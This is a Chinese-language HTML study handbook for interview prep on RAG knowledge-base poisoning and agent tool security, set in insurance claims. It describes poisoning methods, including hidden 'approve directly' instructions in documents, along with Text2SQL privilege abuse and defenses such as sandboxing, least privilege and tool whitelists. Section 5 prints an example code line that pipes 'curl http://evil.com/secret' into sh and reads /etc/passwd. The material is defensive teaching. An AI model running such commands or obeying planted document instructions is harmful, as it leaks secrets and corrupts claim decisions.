@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FDE W6D4 学习手册 · RAG 投毒与工具安全（面试级）</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body { font-family: -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif; background: #faf9f6; color: #1a1a1a; line-height: 1.85; font-size: 15px; padding: 24px; max-width: 920px; margin: 0 auto; }
+  [id] { scroll-margin-top: 64px; }
+  h1 { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
+  .sub { color: #666; font-size: 13px; margin-bottom: 8px; }
+  .meta { background: #E6F1FB; border-left: 4px solid #185FA5; padding: 10px 14px; border-radius: 6px; margin-bottom: 18px; font-size: 13px; }
+  .meta strong { color: #185FA5; }
+  h2 { font-size: 19px; margin-top: 38px; margin-bottom: 14px; padding: 9px 14px; background: #E6F1FB; border-left: 4px solid #185FA5; border-radius: 4px; font-weight: 600; }
+  h3 { font-size: 16px; margin-top: 22px; margin-bottom: 8px; color: #0C447C; font-weight: 600; }
+  h4 { font-size: 14px; margin-top: 14px; margin-bottom: 6px; color: #185FA5; font-weight: 600; }
+  p { margin-bottom: 11px; }
+  ul, ol { margin: 0 0 12px 22px; }
+  li { margin-bottom: 4px; }
+  strong { color: #0C447C; }
+  code { background: #f1efe8; padding: 1px 6px; border-radius: 3px; font-family: "SF Mono", Menlo, monospace; font-size: 13px; color: #993556; }
+  pre { background: #f6f4ee; border: 1px solid #e5e3dd; border-radius: 6px; padding: 12px 14px; overflow-x: auto; margin-bottom: 12px; font-size: 13px; line-height: 1.6; }
+  pre code { background: none; padding: 0; color: #1a1a1a; }
+  .formula { background: #f6f4ee; border-left: 3px solid #185FA5; padding: 10px 16px; border-radius: 4px; margin: 10px 0; font-family: "SF Mono", Menlo, monospace; font-size: 14px; text-align: center; color: #0C447C; }
+  .info { background: #E6F1FB; border-left: 4px solid #185FA5; padding: 10px 14px; border-radius: 6px; margin: 12px 0; font-size: 14px; }
+  .info strong { color: #185FA5; }
+  .warn { background: #FAEEDA; border-left: 4px solid #BA7517; padding: 10px 14px; border-radius: 6px; margin: 12px 0; font-size: 14px; }
+  .warn strong { color: #854F0B; }
+  .warn::before { content: "⚠ 易错点　"; font-weight: 700; color: #BA7517; }
+  .iv { background: #E1F5EE; border-left: 4px solid #0F6E56; padding: 10px 14px; border-radius: 6px; margin: 12px 0; font-size: 14px; }
+  .iv strong { color: #0F6E56; }
+  .iv::before { content: "🎤 面试话术　"; font-weight: 700; color: #0F6E56; }
+  .eng { background: #FBEAF0; border-left: 4px solid #993556; padding: 10px 14px; border-radius: 6px; margin: 12px 0; font-size: 14px; }
+  .eng strong { color: #993556; }
+  .eng::before { content: "🔧 工程含义　"; font-weight: 700; color: #993556; }
+  .topnav { position: sticky; top: 0; z-index: 50; background: rgba(250,249,246,.97); backdrop-filter: blur(6px); border-bottom: 1px solid #e5e3dd; margin: -24px -24px 16px -24px; padding: 8px 24px; display: flex; gap: 5px; flex-wrap: wrap; align-items: center; }
+  .topnav .brand { font-weight: 700; color: #185FA5; font-size: 13px; margin-right: 6px; }
+  .topnav a { font-size: 12px; color: #185FA5; text-decoration: none; padding: 3px 8px; border-radius: 12px; background: #E6F1FB; }
+  .topnav a:hover { background: #185FA5; color: #fff; }
+  .topnav .sep { width: 1px; height: 16px; background: #ddd; margin: 0 3px; }
+  table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 13.5px; background: #fff; }
+  th, td { padding: 8px 10px; border-bottom: 1px solid #e5e3dd; text-align: left; vertical-align: top; }
+  th { background: #f1efe8; font-weight: 600; }
+  .checklist { background: #fff; border: 1px solid #e5e3dd; border-radius: 8px; padding: 14px 18px; margin: 12px 0; }
+  .checklist li { list-style: none; margin-left: -6px; padding-left: 26px; position: relative; }
+  .checklist li::before { content: "☐"; position: absolute; left: 0; color: #185FA5; font-size: 16px; }
+  .qcard { background: #fff; border: 1px solid #e5e3dd; border-left: 4px solid #185FA5; border-radius: 6px; padding: 10px 14px; margin: 8px 0; }
+  .qcard .q { font-weight: 600; color: #1a1a1a; }
+  .qcard .a { color: #0F6E56; font-size: 13.5px; margin-top: 4px; }
+  .qcard .a::before { content: "一句话答："; font-weight: 700; color: #0F6E56; }
+  .ft { text-align: center; color: #888; font-size: 12px; margin-top: 40px; padding-top: 18px; border-top: 1px solid #e5e3dd; }
+
+  /* ===== 标注功能 ===== */
+  mark.anno { background: #FFF3B0; border-bottom: 2px solid #E0A800; padding: 0 1px; border-radius: 2px; cursor: pointer; color: inherit; }
+  mark.anno:hover { background: #FFE066; }
+  mark.anno.flash { animation: annoFlash 1.2s ease; }
+  @keyframes annoFlash { 0%,100%{background:#FFF3B0;} 50%{background:#FFD43B;} }
+  #annoToggleLeft, #annoToggleRight { position: fixed; bottom: 18px; width: 50px; height: 50px; border-radius: 50%; color: #fff; border: none; font-size: 22px; cursor: pointer; box-shadow: 0 2px 12px rgba(0,0,0,.25); z-index: 99; display: flex; align-items: center; justify-content: center; }
+  #annoToggleLeft { left: 18px; background: #993556; }
+  #annoToggleLeft:hover { background: #72243E; }
+  #annoToggleRight { right: 18px; background: #185FA5; }
+  #annoToggleRight:hover { background: #0C447C; }
+  #annoToggleLeft .badge, #annoToggleRight .badge { position: absolute; top: -4px; right: -4px; background: #fff; font-size: 11px; min-width: 18px; height: 18px; border-radius: 9px; display: none; align-items: center; justify-content: center; padding: 0 4px; font-weight: 700; border: 1.5px solid currentColor; }
+  .anno-panel { position: fixed; top: 0; bottom: 0; width: 340px; max-width: 92vw; background: #fff; box-shadow: 0 0 14px rgba(0,0,0,.08); z-index: 100; display: flex; flex-direction: column; transition: transform .25s ease; }
+  #annoPanelLeft { left: 0; border-right: 1px solid #e5e3dd; transform: translateX(-100%); }
+  #annoPanelRight { right: 0; border-left: 1px solid #e5e3dd; transform: translateX(100%); }
+  #annoPanelLeft.open, #annoPanelRight.open { transform: translateX(0); }
+  .anno-panel .ap-head { padding: 12px 14px; border-bottom: 1px solid #e5e3dd; display: flex; align-items: center; justify-content: space-between; }
+  #annoPanelLeft .ap-head { background: #F4C0D1; color: #72243E; }
+  #annoPanelRight .ap-head { background: #FFF3B0; color: #854F0B; }
+  .anno-panel .ap-head .title { font-weight: 700; font-size: 15px; }
+  .anno-panel .ap-head .count { font-size: 12px; margin-top: 2px; opacity: .85; }
+  .anno-panel .ap-close { background: none; border: none; font-size: 20px; cursor: pointer; padding: 0 4px; line-height: 1; }
+  #annoPanelLeft .ap-close { color: #72243E; }
+  #annoPanelRight .ap-close { color: #854F0B; }
+  .anno-panel .ap-close:hover { opacity: .7; }
+  .anno-panel .ap-body { flex: 1; overflow-y: auto; padding: 10px 12px; }
+  .anno-panel .col-empty { color: #bbb; font-size: 12px; text-align: center; padding: 28px 8px; line-height: 1.7; }
+  .anno-item { background: #faf9f6; border: 1px solid #e5e3dd; border-left: 3px solid #E0A800; border-radius: 6px; padding: 8px 10px; margin-bottom: 8px; }
+  .anno-item.imp { border-left-color: #993556; }
+  .anno-item .ai-text { font-size: 13px; color: #1a1a1a; font-weight: 500; cursor: pointer; word-break: break-all; line-height: 1.5; }
+  .anno-item .ai-text:hover { color: #185FA5; }
+  .anno-item .ai-text .miss { color: #993556; font-size: 11px; font-weight: 400; }
+  .anno-item textarea { width: 100%; margin-top: 6px; border: 1px solid #e5e3dd; border-radius: 4px; padding: 6px 8px; font-size: 12.5px; font-family: inherit; resize: vertical; min-height: 46px; background: #fff; color: #1a1a1a; }
+  .anno-item textarea:focus { outline: none; border-color: #185FA5; box-shadow: 0 0 0 2px rgba(24,95,165,.12); }
+  .anno-item .ai-foot { display: flex; justify-content: space-between; align-items: center; margin-top: 4px; }
+  .anno-item .ai-time { font-size: 10px; color: #aaa; }
+  .anno-item .ai-del { background: none; border: none; color: #993556; font-size: 11px; cursor: pointer; padding: 2px 4px; }
+  .anno-item .ai-del:hover { text-decoration: underline; }
+  .anno-panel .ap-foot { padding: 8px 12px; border-top: 1px solid #e5e3dd; display: flex; gap: 6px; background: #faf9f6; }
+  .anno-panel .ap-foot button { flex: 1; padding: 7px; font-size: 12px; border: 1px solid #e5e3dd; background: #fff; border-radius: 4px; cursor: pointer; color: #444; }
+  .anno-panel .ap-foot button:hover { background: #f1efe8; }
+  #annoBubble { position: absolute; background: #fff; padding: 4px; display: none; flex-direction: row; gap: 2px; border: 1px solid #d3d1c7; border-radius: 6px; box-shadow: 0 2px 10px rgba(0,0,0,.25); z-index: 1000; user-select: none; }
+  #annoBubble .abtn { padding: 5px 11px; border-radius: 5px; font-size: 12px; cursor: pointer; white-space: nowrap; font-weight: 600; }
+  #annoBubble .abtn.q { background: #FFF3B0; color: #854F0B; }
+  #annoBubble .abtn.q:hover { background: #FFE066; }
+  #annoBubble .abtn.i { background: #F4C0D1; color: #72243E; }
+  #annoBubble .abtn.i:hover { background: #ED93B1; }
+  mark.anno.imp { background: #F4C0D1; border-bottom-color: #993556; }
+  mark.anno.imp:hover { background: #ED93B1; }
+  mark.anno.imp.flash { animation: annoFlashImp 1.2s ease; }
+  @keyframes annoFlashImp { 0%,100%{background:#F4C0D1;} 50%{background:#ED93B1;} }
+  #annoTip { position: fixed; left: 50%; bottom: 22px; transform: translateX(-50%); background: #0C447C; color: #fff; padding: 8px 16px; border-radius: 20px; font-size: 12.5px; z-index: 1001; opacity: 0; transition: opacity .3s; pointer-events: none; }
+  #annoTip.show { opacity: 1; }
+  @media (max-width: 760px) { .anno-panel { width: 46vw; min-width: 220px; } }
+</style>
+</head>
+<body>
+
+<div class="topnav">
+  <span class="brand">W6D4 学习手册</span>
+  <a href="#s1">1.RAG投毒原理</a><a href="#s2">2.保险风险</a><a href="#s3">3.投毒防护</a><a href="#s4">4.SQL越权</a><a href="#s5">5.代码执行</a>
+  <span class="sep"></span>
+  <a href="#s6">6.最小权限</a><a href="#s7">7.白名单</a><a href="#s8">8.衔接W3/D3</a><a href="#s9">达标①</a><a href="#s10">达标②</a>
+  <span class="sep"></span>
+  <a href="#s11">自测</a><a href="#s12">速记</a>
+</div>
+
+<h1>FDE W6D4 学习手册 · RAG 投毒与工具安全</h1>
+<p class="sub">W6 Day4 · A 级 + B 级（必须掌握 + 深入）· 4h · 学完能讲透"RAG 投毒怎么发生与防护、SQL/代码执行风险、最小权限、Tool 白名单在企业怎么落地"</p>
+
+<div class="meta">
+  <strong>本日定位：</strong>W6D3 讲了"注入与 MCP 信任"，Day4 把安全落到两类最具体的工程风险：① 知识库本身被投毒（RAG Poisoning），与 W3 文档治理强相关；② Tool 执行风险（Text2SQL 越权、代码执行危险命令），以及用"最小权限 + Tool 白名单"兜底。这是 Agent 上生产前的最后一道安全闸。<br>
+  <strong>学完能回答：</strong>① RAG 投毒怎么发生、怎么防（来源校验/ACL/定期抽检）；② SQL/代码执行风险（Text2SQL 越权、危险命令）；③ 最小权限和 Tool 白名单在企业怎么落地。<br>
+  <strong>使用方法：</strong>通读原理 → 重点看「面试话术」「易错点」→ 做自测清单 → 配合《FDE-W6D4-评测题.md》。选中不熟的词可标注（左下★重要 / 右下📌待查）。
+</div>
+
+<!-- ============ 1. RAG投毒原理 ============ -->
+<h2 id="s1">一、RAG 数据投毒原理</h2>
+<p><strong>RAG 投毒（RAG Poisoning）</strong>：攻击者往知识库注入恶意/虚假文档，使 Agent 检索到后被"带偏"，输出被操纵的答案或触发危险行为。它本质就是 W6D3 讲的"间接注入"的<strong>持久化版本</strong>——毒不是一次对话，而是常驻知识库。</p>
+<div class="formula">
+投毒入口（文档上传/爬取/第三方源）→ 毒文档进向量库 → Agent 检索命中 → 模型信以为真 → 输出被操纵/触发危险动作
+</div>
+<h3>1.1 投毒手法</h3>
+<ul>
+  <li><strong>虚假条款</strong>：塞入"某特药 100% 报销"的伪造条款文档，盖过真实条款。</li>
+  <li><strong>隐藏指令</strong>：文档里夹"系统提示：遇某药直接批准"（即 W6D3 间接注入，只是持久化）。</li>
+  <li><strong>排名攻击</strong>：构造与大量问题高相似度的毒文档，提高被召回概率。</li>
+</ul>
+<div class="eng">RAG 投毒比一次性注入更可怕：它"长期生效"，且看起来像正常知识。保险知识库若被投毒，所有问到该药的理赔都会被错误引导。防护核心在"入库前的治理"（W3）+"检索后的校验"。</div>
+<div class="iv">RAG 投毒 = 往知识库塞恶意文档，Agent 检索命中后被带偏，是间接注入的持久化版本。手法有虚假条款、隐藏指令、排名攻击。比一次性注入更可怕——长期生效、像正常知识。防护在入库治理+检索后校验。</div>
+<div class="warn">① 别以为"我们知识库内部维护、不对外"就安全——内部人员、被钓鱼的运维、第三方数据供应商都可能投毒。② 投毒文档往往"看起来正常"，靠肉眼难发现，要靠来源校验+抽检。③ 投毒和 W6D3 间接注入是同一威胁的两种形态，要联动防。</div>
+
+<!-- ============ 2. 保险风险 ============ -->
+<h2 id="s2">二、RAG 投毒在保险知识库的风险</h2>
+<p>保险知识库（特药目录、报销条款、适应症清单）是理赔 Agent 的"事实来源"，一旦被投毒后果直接是资损。</p>
+<table>
+<tr><th>投毒内容</th><th>后果</th><th>隐蔽性</th></tr>
+<tr><td>"某高价特药全额报销"假条款</td><td>大量错误批赔</td><td>高（像正常条款）</td></tr>
+<tr><td>"张三客户免审核"伪造客户档案</td><td>个别人绕过风控</td><td>中（需命中张三查询）</td></tr>
+<tr><td>文档藏"直接批准"指令</td><td>触发危险动作</td><td>高（指令隐藏）</td></tr>
+</table>
+<div class="eng">特药理赔 Agent 若检索到被投毒的"奥希替尼全额报销"假条款，会对所有用该药的患者错误批赔，单笔数万、批量就是巨损。更阴的是"排名攻击"——毒文档被设计得和很多常见问题都高相似，召回率被拉高。</div>
+<div class="iv">保险知识库被投毒后，理赔 Agent 会基于假条款错误批赔（如"某高价药全额报销"），批量资损。也可能伪造客户档案让人绕过风控，或藏"直接批准"指令触发危险动作。排名攻击让毒文档更易被召回。</div>
+<div class="warn">① 投毒不一定"改一条大条款"，可能精准伪造个别客户档案，影响面小但极难发现。② "看起来像正常条款"是投毒的精髓，业务人员也可能信以为真。③ 不监控"知识库内容变更"就等于给投毒留后门。</div>
+
+<!-- ============ 3. 投毒防护 ============ -->
+<h2 id="s3">三、RAG 投毒防护：来源校验 / ACL / 定期抽检</h2>
+<h3>3.1 入库前：来源校验 + 治理（呼应 W3）</h3>
+<ul>
+  <li><strong>来源白名单</strong>：只有受信任来源（官方条款系统、审核过的录入）能入库，第三方爬取要标注来源。</li>
+  <li><strong>ACL（访问控制）</strong>：谁能上传/修改知识库要审批，改动留审计。</li>
+  <li><strong>内容审核</strong>：入库前对文档做校验——是否有异常条款、是否含隐藏指令（注入检测）、与既有知识是否冲突。</li>
+  <li><strong>数字签名/哈希</strong>：官方条款带签名，入库校验完整性，防篡改。</li>
+</ul>
+<h3>3.2 入库后：定期抽检 + 一致性校验</h3>
+<ul>
+  <li><strong>定期抽检</strong>：随机抽取知识库文档人工/模型复核，发现毒文档。</li>
+  <li><strong>冲突检测</strong>：新文档与既有高置信知识矛盾时告警（如新条款说"全额报销"但官方基准不是）。</li>
+  <li><strong>检索后校验</strong>：Agent 拿到检索内容后，对关键结论（报销比例/适应症）做规则或二次确认，异常转人工。</li>
+</ul>
+<div class="eng">防护是"纵深"的：入库把关（来源/ACL/审核）+ 持续监控（抽检/冲突检测）+ 检索后兜底（关键结论校验）。W3 的文档治理是底座，本日补"投毒专项"——不仅管"格式对"，还要管"内容没被恶意改"。</div>
+<div class="iv">RAG 投毒防护三层：① 入库前——来源白名单+ACL+内容审核（查隐藏指令/异常条款）+签名校验；② 入库后——定期抽检+冲突检测（新文档与官方基准矛盾告警）；③ 检索后——关键结论（报销比例/适应症）做规则校验，异常转人工。和 W3 文档治理是底座关系。</div>
+<div class="warn">① 只有来源白名单不够——内部人员也能投毒，还要 ACL+审计+内容审核。② 签名校验若密钥管理不当（密钥泄露）形同虚设。③ 检索后不校验，毒文档一旦入库就会直接生效；抽检频率太低则发现晚、资损大。</div>
+
+<!-- ============ 4. SQL越权 ============ -->
+<h2 id="s4">四、SQL / 代码执行风险（1）：Text2SQL 越权</h2>
+<p>很多 Agent 用 <strong>Text2SQL</strong> 让模型把自然语言转成 SQL 查数据库。风险在于：模型可能生成<strong>越权或危险</strong>的 SQL。</p>
+<table>
+<tr><th>风险</th><th>示例</th></tr>
+<tr><td>越权查敏感字段</td><td>"查下张三的身份证号和银行卡" → 生成 SELECT 身份证,银行卡</td></tr>
+<tr><td>越权跨表</td><td>本该查理赔表，却生成 JOIN 用户隐私表</td></tr>
+<tr><td>危险写操作</td><td>"把这批理赔都改成通过" → UPDATE 全表</td></tr>
+<tr><td>无 LIMIT 爆量</td><td>SELECT * 无限制，拖垮库</td></tr>
+</table>
+<h3>4.1 为什么难控</h3>
+<ul>
+  <li>模型生成的 SQL 是"自由文本"，传统 SQL 审核（基于固定模板）难覆盖。</li>
+  <li>用户问题可能诱导（Direct 注入）"帮我查下竞争对手的客户名单"。</li>
+</ul>
+<div class="eng">保险场景 Text2SQL 必须：① 用<strong>只读账号</strong>连库（见 s6）；② SQL 生成后过<strong>策略校验</strong>（只允许 SELECT、只允许白名单表/字段、强制 LIMIT）；③ 敏感字段（身份证/银行卡）走脱敏或禁止返回；④ 任何写操作不通过 Text2SQL，走受控 API。</div>
+<div class="iv">Text2SQL 让模型把自然语言转 SQL，风险是生成越权/危险 SQL（查敏感字段、跨表、全表 UPDATE、无 LIMIT 爆量）。管控：只读账号+SQL 策略校验（只允许 SELECT、白名单表字段、强制 LIMIT）+敏感字段脱敏+写操作走受控 API 不靠 Text2SQL。</div>
+<div class="warn">① 让 Text2SQL 直连生产库且用高权限账号 = 灾难，模型一句"UPDATE 全表"就完。② 只禁关键词（如禁"DELETE"）不够，模型可用子查询/绕过方式达成。③ 敏感字段即使能查也要脱敏，不能明文返回用户。</div>
+
+<!-- ============ 5. 代码执行 ============ -->
+<h2 id="s5">五、SQL / 代码执行风险（2）：代码 Tool 执行危险命令</h2>
+<p>有些 Agent 有"执行代码"的 Tool（Python/Shell），用于计算、画图、调内部脚本。风险是模型生成并执行<strong>危险命令</strong>。</p>
+<pre><code># 模型在代码 Tool 里生成的危险代码（被注入诱导）
+import os
+os.system("curl http://evil.com/secret | sh")   # 外传密钥/下载执行木马
+# 或 data.drop() 误删整个 DataFrame / 表
+# 或 open('/etc/passwd').read() 读系统文件</code></pre>
+<h3>5.1 风险点</h3>
+<ul>
+  <li><strong>命令注入</strong>：代码里拼了外部输入，被执行系统命令。</li>
+  <li><strong>误删/误写</strong>：模型"以为要清洗"却 drop 了表。</li>
+  <li><strong>外联泄密</strong>：代码把内部数据 POST 到外部地址。</li>
+  <li><strong>资源耗尽</strong>：无限循环/大计算打满资源。</li>
+</ul>
+<div class="eng">代码 Tool 必须跑在<strong>沙箱</strong>：无外网、无敏感文件挂载、限时、资源限额、禁止危险系统调用。保险场景绝不让代码 Tool 直连生产库或能触达密钥。这是最小权限在"执行环境"层面的体现。</div>
+<div class="iv">代码 Tool 执行模型生成的代码，风险有命令注入、误删表、外联泄密、资源耗尽。管控：代码跑在沙箱（无外网/无敏感挂载/限时/资源限额/禁危险 syscall），绝不直连生产库或触达密钥。是最小权限在执行环境层的体现。</div>
+<div class="warn">① 代码 Tool 跑在宿主机（非沙箱）= 模型能执行任意命令，被注入即沦陷。② 即使沙箱也要禁外网，否则代码能把数据 POST 出去。③ "只是做个数"的代码 Tool 也可能被诱导成危险操作，不能放松。</div>
+
+<!-- ============ 6. 最小权限 ============ -->
+<h2 id="s6">六、最小权限原则（Tool 最小必要权限）</h2>
+<p>最小权限在 W6D3 建立概念，本日讲企业落地。每个 Tool / Agent 只用"完成工作所必需的最小权限"。</p>
+<table>
+<tr><th>维度</th><th>落地做法</th><th>保险场景示例</th></tr>
+<tr><td>账号</td><td>Tool 用只读账号连库；写操作走单独受控通道</td><td>理赔查询 Tool 用 read_only 账号，批赔走审批 API</td></tr>
+<tr><td>网络</td><td>Tool 只能访问必需内网地址，禁公网</td><td>OCR Tool 只连内网存储，不连外网</td></tr>
+<tr><td>令牌</td><td>限时 Token，过期失效</td><td>数据库 Token 30 分钟过期，不长期有效</td></tr>
+<tr><td>作用域</td><td>Token scope 精确到资源</td><td>scope=claim:read，不能 user:read</td></tr>
+<tr><td>环境</td><td>代码 Tool 跑沙箱</td><td>无外网/无密钥挂载/资源限额</td></tr>
+</table>
+<div class="eng">最小权限要"按需申请、用毕回收"。企业里常犯"权限蠕变"——某 Tool 最初只需读，后来顺手加了写，再后来连了公网，权限越积越大。要定期权限复核（access review），把权限拉回最小。</div>
+<div class="iv">最小权限落地：只读账号连库、写走受控通道；Tool 限内网禁公网；限时 Token+精确 scope；代码 Tool 跑沙箱。关键是"按需申请、用毕回收"，并定期权限复核防蠕变。保险场景查询用 read_only、批赔走审批 API。</div>
+<div class="warn">① 给 Agent 一个"万能 Token"是常见错误，被注入即全崩。② 权限蠕变是慢性毒：要定期 access review，否则最小权限名存实亡。③ 限时 Token 过期策略不能设太长，否则等于长期有效。</div>
+
+<!-- ============ 7. 白名单 ============ -->
+<h2 id="s7">七、Tool 白名单（未知不执行）</h2>
+<p><strong>Tool 白名单</strong>：Agent 只允许调用预先审核过的已知安全 Tool，任何不在白名单的 Tool 一律不执行。</p>
+<table>
+<tr><th>机制</th><th>说明</th></tr>
+<tr><td>Tool 注册审核</td><td>新 Tool 上线前人工审核描述与权限（防 W6D3 Tool Poisoning）</td></tr>
+<tr><td>运行期校验</td><td>模型要调的 Tool 必须在白名单，否则拒绝</td></tr>
+<tr><td>能力分级</td><td>白名单按风险分级，高危 Tool 需二次确认/审批</td></tr>
+<tr><td>默认拒绝</td><td>白名单外一律 deny，而非 allow</td></tr>
+</table>
+<div class="eng">白名单 + 最小权限是"纵深防御"的两道闸：白名单决定"能不能调这个 Tool"，最小权限决定"调了能做什么"。两者结合，即使模型被注入想调危险 Tool，也会被白名单拦下；即使漏进白名单，最小权限也限制破坏范围。</div>
+<div class="iv">Tool 白名单 = 只允审核过的已知安全 Tool，未知一律不执行（默认拒绝）。新 Tool 上线前审核描述与权限防投毒，运行期校验，高危 Tool 需审批。它与最小权限是双闸：白名单管"能不能调"，最小权限管"调了能做什么"。</div>
+<div class="warn">① 白名单若"包含未审核描述的 Tool"，仍会被 Tool Poisoning 利用——白名单≠安全，描述也要审。② 默认应该是 deny（白名单外拒绝），别做成"默认允许、黑名单拦截"，黑名单永远漏。③ 白名单要随业务演进维护，否则要么过严误事、要么腐烂变松。</div>
+
+<!-- ============ 8. 衔接 ============ -->
+<h2 id="s8">八、与 W3 文档治理、W6D3 MCP 安全的关系</h2>
+<table>
+<tr><th>已学</th><th>与本日关系</th></tr>
+<tr><td>W3 文档治理</td><td>知识库"格式/来源/切分"治理是 RAG 投毒防护的底座；本日补"投毒专项"（内容完整性/隐藏指令）</td></tr>
+<tr><td>W6D3 MCP/注入</td><td>间接注入是投毒的"一次对话"形态，投毒是其"持久化"形态；MCP 不可信、Annotation 非鉴权直接决定 Tool 白名单/最小权限怎么设计</td></tr>
+<tr><td>W6D1/D2 评测/版本</td><td>投毒防护效果要靠评测（对抗样本）验证；知识库/白名单变更要靠版本管理与回归</td></tr>
+</table>
+<div class="eng">安全是体系，不是单点。RAG 投毒靠"W3 治理 + 本日投毒防护 + W6D1 对抗评测"三件套；Tool 执行风险靠"W6D3 白名单/最小权限理念 + 本日落地（SQL 策略/沙箱）"。FDE 面试希望你能把这几块串成一条安全链路。</div>
+<div class="iv">本日串起前面：W3 文档治理是 RAG 投毒防护底座，本日补投毒专项；W6D3 的 MCP 不可信/Annotation 非鉴权直接决定白名单与最小权限怎么设计；投毒防护效果靠 W6D1 对抗评测验证、靠 W6D2 版本管理回归。安全是体系不是单点。</div>
+<div class="warn">① 别把各天当孤立知识点——面试官常跨天追问"投毒怎么测"（回到 D1 对抗样本）、"白名单变更怎么管"（回到 D2 版本）。② 只做投毒防护不做评测验证，等于不知防住没。③ 安全链路任一层断都前功尽弃，要整体看。</div>
+
+<!-- ============ 9. 达标线① ============ -->
+<h2 id="s9">九、面试达标线①：RAG 投毒怎么发生、怎么防</h2>
+<div class="formula">
+发生：投毒入口 → 毒文档进向量库（持久化） → 检索命中 → 模型信以为真 → 输出被操纵/触发危险
+防护：入库前(来源白名单+ACL+内容审核+签名) + 入库后(定期抽检+冲突检测) + 检索后(关键结论校验转人工)
+</div>
+<div class="iv">RAG 投毒是往知识库塞恶意文档，Agent 检索命中被带偏，是间接注入的持久化版本，比一次性注入更可怕（长期生效、像正常知识）。防护三层：入库前来源白名单+ACL+内容审核+签名；入库后定期抽检+冲突检测；检索后关键结论（报销比例/适应症）校验异常转人工。和 W3 文档治理是底座关系。</div>
+
+<!-- ============ 10. 达标线② ============ -->
+<h2 id="s10">十、面试达标线②：最小权限 + Tool 白名单企业落地</h2>
+<ol>
+  <li><strong>最小权限落地</strong>：Tool 用只读账号连库、写走受控通道；Tool 限内网禁公网；限时 Token + 精确 scope；代码 Tool 跑沙箱（无外网/无密钥/资源限额）；定期权限复核防蠕变。</li>
+  <li><strong>Tool 白名单落地</strong>：只允审核过的已知安全 Tool，未知默认拒绝；新 Tool 上线前审核描述与权限（防 Tool Poisoning）；运行期校验；高危 Tool 需审批；白名单随业务维护。</li>
+  <li><strong>两者关系</strong>：白名单管"能不能调这个 Tool"，最小权限管"调了能做什么"，双闸纵深防御。再加 Text2SQL 策略校验（只允许 SELECT/白名单表字段/强制 LIMIT/敏感字段脱敏）与代码沙箱，覆盖 SQL/代码执行风险。</li>
+</ol>
+<div class="iv">最小权限落地 = 只读账号+受控写通道+限内网+限时 Token+精确 scope+代码沙箱+定期复核。Tool 白名单 = 只允审核过 Tool、未知默认拒绝、描述也要审、高危需审批。双闸：白名单管能不能调、最小权限管调了能做什么。再加 SQL 策略校验与代码沙箱，覆盖执行风险。</div>
+
+<!-- ============ 11. 自测清单 ============ -->
+<h2 id="s11">十一、W6D4 自测清单</h2>
+<div class="checklist">
+<ul>
+<li>能定义 RAG 投毒，并说明它是 W6D3 间接注入的"持久化版本"。</li>
+<li>能列举 RAG 投毒手法（虚假条款/隐藏指令/排名攻击）及保险场景后果（错误批赔/绕过风控）。</li>
+<li>能讲清 RAG 投毒防护三层：入库前（来源/ACL/审核/签名）、入库后（抽检/冲突检测）、检索后（关键结论校验）。</li>
+<li>能解释为什么"只靠来源白名单"不够（内部人员也能投毒，还要审计+内容审核）。</li>
+<li>能说清 Text2SQL 的越权风险（查敏感字段/跨表/全表 UPDATE/无 LIMIT）及管控（只读账号+SQL 策略+脱敏+写走 API）。</li>
+<li>能列举代码 Tool 的执行风险（命令注入/误删/外联泄密/资源耗尽）及沙箱要求。</li>
+<li>能解释最小权限的各维度落地（账号/网络/令牌/作用域/环境）。</li>
+<li>能说明"权限蠕变"是什么，为什么需要定期权限复核。</li>
+<li>能讲清 Tool 白名单机制（默认拒绝、描述审核、运行期校验、高危审批）。</li>
+<li>能区分白名单与最小权限的分工（能不能调 vs 调了能做什么）。</li>
+<li>能串起 W3 文档治理、W6D3 注入/MCP、W6D1 评测、W6D2 版本与本日安全的关系。</li>
+<li>能说出 OWASP LLM Top 10 / Agentic Security 在其中的位置。</li>
+</ul>
+</div>
+
+<!-- ============ 12. 速记卡 ============ -->
+<h2 id="s12">十二、高频面试题速记卡</h2>
+<div class="qcard"><div class="q">Q：RAG 投毒和 W6D3 的间接注入什么关系？</div><div class="a">同一威胁两种形态。间接注入是"一次对话"被外部内容带偏；投毒是恶意文档常驻知识库，"持久化"带偏，长期生效、更隐蔽。防护要联动。</div></div>
+<div class="qcard"><div class="q">Q：RAG 投毒怎么防？</div><div class="a">三层：入库前（来源白名单+ACL+内容审核查隐藏指令+签名）；入库后（定期抽检+冲突检测）；检索后（关键结论如报销比例校验，异常转人工）。底座是 W3 文档治理。</div></div>
+<div class="qcard"><div class="q">Q：为什么只靠来源白名单防不住投毒？</div><div class="a">内部人员、被钓鱼的运维、第三方供应商都可能投毒。还要 ACL+审计+内容审核+签名校验，且密钥管理要严。</div></div>
+<div class="qcard"><div class="q">Q：Text2SQL 有什么风险？怎么管？</div><div class="a">模型生成越权/危险 SQL（查敏感字段、跨表、全表 UPDATE、无 LIMIT 爆量）。管：只读账号+SQL 策略校验（只 SELECT/白名单表字段/强制 LIMIT）+敏感字段脱敏+写操作走受控 API。</div></div>
+<div class="qcard"><div class="q">Q：代码 Tool 为什么危险？怎么隔离？</div><div class="a">模型生成的代码可能命令注入、误删表、外联泄密、耗资源。必须跑沙箱：无外网、无敏感挂载、限时、资源限额、禁危险 syscall，绝不直连生产库。</div></div>
+<div class="qcard"><div class="q">Q：最小权限在企业怎么落地？</div><div class="a">只读账号连库、写走受控通道；Tool 限内网禁公网；限时 Token+精确 scope；代码 Tool 跑沙箱；定期权限复核防蠕变。按需申请、用毕回收。</div></div>
+<div class="qcard"><div class="q">Q：Tool 白名单和最小权限分工是什么？</div><div class="a">白名单管"能不能调这个 Tool"（默认拒绝未知）；最小权限管"调了能做什么"。双闸纵深防御：即使想调危险 Tool 被白名单拦，漏进也因最小权限受限。</div></div>
+<div class="qcard"><div class="q">Q：白名单为什么必须"默认拒绝"而非"默认允许"？</div><div class="a">黑名单永远漏（攻击者可换未列出的 Tool/描述）。默认拒绝白名单外一切，只有审核过的已知安全 Tool 才放行，才稳。</div></div>
+<div class="qcard"><div class="q">Q：什么是权限蠕变？怎么治？</div><div class="a">Tool 最初只需读，后来顺手加写、连公网，权限越积越大。治：定期 access review 把权限拉回最小，删除不再需要的授权。</div></div>
